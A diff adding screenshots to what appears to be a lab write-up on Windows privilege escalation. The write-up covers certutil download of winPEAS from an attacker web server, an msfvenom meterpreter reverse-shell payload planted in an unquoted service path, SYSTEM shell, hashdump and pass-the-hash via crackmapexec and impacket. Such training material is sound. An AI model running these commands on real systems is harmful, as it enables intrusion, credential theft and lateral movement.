@@ -259,30 +259,42 @@ On your Kali box, go to this link -> Release Release refs/heads/master 20261029-
 From here, download the winPEASx64.exe 
 Once you download it, you need to transfer it over to the windows machine. 
 On your Kali system, you need to start a python webserver where the winpeas.exe is. Please note, I just changed the name of the .exe to make it easier to type. 
+
 Command for python web server — python3 -m http.server <port number> 
 
-
+<img width="1250" height="198" alt="image" src="https://github.com/user-attachments/assets/c10381a3-9be2-4903-bcb3-625314f68642" />
  
 Now that we have a webserver hosting the file, lets go to the windows reverse shell we have to get the file using certutil. 
 On the windows machine, use the command 
 certutil -urlcache -f -split http://192.168.44.128:9000/winpeas.exe
-File was successfully downloaded 
+File was successfully downloaded
+
+<img width="1250" height="505" alt="image" src="https://github.com/user-attachments/assets/ce3c5fa9-6e38-4adf-9c18-e77e301a0744" />
  
 Now that the file has successfully been downloaded onto our system, we need to run winpeas.exe by running .\winpeas.exe 
 This will do a ton of output. Go through it to get familiar with it to see what to look for and things like that. 
+
 We have found an unquoted service path. We can leverage this exploit by knowing that when running a .exe in this unquoted service path that it would run under SYSTEM, thus giving us the highest-level access we can get on a Windows system. 
+
+<img width="1250" height="130" alt="image" src="https://github.com/user-attachments/assets/8f0ae5b2-8037-41d4-b479-3eb1f0c877d7" />
  
 Now, let's just double check if our user account we are in has the permissions to perform this task by doing “net session”. If it says “There are no entries in the list” then our current session is already elevated as an administrator. If it says “Access is denied” then this means our current command window is not elevated. 
 Net session results look promising: 
+
+<img width="578" height="152" alt="image" src="https://github.com/user-attachments/assets/b45a8558-bedc-49e6-bd32-d7ac42c7389a" />
  
 We also run the commands: 
 •	net user %username% 
 •	net localgroup Administrators
+
+<img width="1250" height="994" alt="image" src="https://github.com/user-attachments/assets/62ab5163-d2a9-453a-af11-bddd7e10df78" />
  
 We can confirm this user is in the admin group, so we do have the correct permissions to write. 
 Let's craft a msfvenom payload to setup a reverse shell to get SYSTEM access
 In Kali, we run the following command: 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe -o payload.exe
+
+<img width="1250" height="225" alt="image" src="https://github.com/user-attachments/assets/f25607c0-6bc2-445d-8d90-cec5cf52b75f" />
  
 We created the file as “wise.exe” because Windows will run through the unquoted service path like this: 
 •	C:\Program.exe
@@ -290,34 +302,60 @@ We created the file as “wise.exe” because Windows will run through the unquo
 •	C:\Program Files (x86).exe
 •	C:\Program Files (x86)\Wise.exe 
 This is why we created the payload “wise.exe” because Windows will execute this payload and it should be under as SYSTEM. 
+
 We have transferred over the payload using the certutil command 
+
+<img width="1245" height="556" alt="image" src="https://github.com/user-attachments/assets/c1750931-1c45-41df-bfc9-ec68d71554d8" />
  
 Now, we need to setup a meterperter listener to catch the inbound call from the target computer. 
+
 Here is he command I use in Metasploit 
+
+<img width="1111" height="297" alt="image" src="https://github.com/user-attachments/assets/ca799394-faad-45a1-a6dd-d115a5990044" />
  
 Next, hit exploit in Metasploit to run this listener
+
 Now that its running, we head back over to the windows reverse java shell we had and run the wise.exe by using “.\wise.exe”
  
+<img width="605" height="139" alt="image" src="https://github.com/user-attachments/assets/f97bd1ff-1396-4ad0-b2e5-4d6406673c20" />
 
 Now, lets go back to our Metasploit we have open
+
 Looks like we successfully captured the session
- 
+
+<img width="1250" height="97" alt="image" src="https://github.com/user-attachments/assets/d264c080-af76-458b-b5db-cb00b1afa6b6" /> 
 
 Now, when I do the getuid command, we can see we are running as SYSTEM, which is the highest level on a windows computer. 
+
+<img width="522" height="109" alt="image" src="https://github.com/user-attachments/assets/8fb9fff7-e192-4461-b604-7da9f599516c" />
  
 Now, we can use hashdump to get the hashes of the user accounts
+
+<img width="1250" height="222" alt="image" src="https://github.com/user-attachments/assets/62d9ebb8-96cc-43f6-ae42-a985d9bfc7ed" />
  
 Looks like we have a built in Admin account. We will take the hash and put it in a text file to try and crack it. But first, we need to determine what type of hash this is. 
 Hash-identifier: 
+
+<img width="1203" height="572" alt="image" src="https://github.com/user-attachments/assets/431dcd4c-fdfd-4442-b587-b6077b38c2a1" />
+
  
 Name-That-Hash:
+
+<img width="1250" height="445" alt="image" src="https://github.com/user-attachments/assets/b009adf4-de3a-4920-b61d-5371e8089188" />
  
 From the results, this password hash is either from MD5 or NTLM. 
+
 Now lets feed this to John and Hashcat to see if we can crack this hash. 
+
 After trying John and Hahscat, we cannot crack the Admin password as it is a very complex password that is not in any dictionary attack list. 
+
+<img width="1023" height="611" alt="image" src="https://github.com/user-attachments/assets/6699ed5f-19dc-4a54-82d3-a44a4865b893" />
  
 This is fine as we can use the pash-the-hash technique to login as well. 
+
 We use crackmapexec to see if we can get on the system using butler or Admin and it looks like we can with both. This is just a good tool to use in case you were scanning a big network. This tool just lets you validate the credentials against all the computers on the network. 
+
+<img width="1250" height="192" alt="image" src="https://github.com/user-attachments/assets/5a3fd33d-813d-45e3-9adf-4a3947055567" />
  
 Then we use impacket-wmiexec to see if we can get access with the Admin account and have a reverse shell with SMB. 
 We are able to pass the hash of the admin account to login via SMB 
